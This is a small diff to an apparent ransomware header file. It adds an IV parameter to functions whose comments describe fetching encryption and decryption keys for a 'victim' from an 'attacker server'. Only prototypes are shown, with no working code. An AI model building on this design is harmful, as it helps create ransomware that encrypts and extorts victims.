@@ -20,14 +20,14 @@
  * @param p_data The benchmark data of the current computer.
  * @param p_algo The algorithm chosen by attacker server.
 */
-char* get_encryption_key(char* p_identifier, benchmarkData* p_data, char** p_algo);
+char* get_encryption_key(char* p_identifier, benchmarkData* p_data, char** p_algo, char** p_iv);
 
 /**
  * @brief Connect to the server and get the decryption key.
  * @param p_identifier The unique identifier of the victim in aim to retrieve the decryption keys associate to it.
  * @param p_algo The algorithm chosen by attacker server.
 */
-char* get_decryption_key(char* p_identifier, char** p_algo);
+char* get_decryption_key(char* p_identifier, char** p_algo, char** p_iv);
 
 /**
  * @brief Save a key in a file.
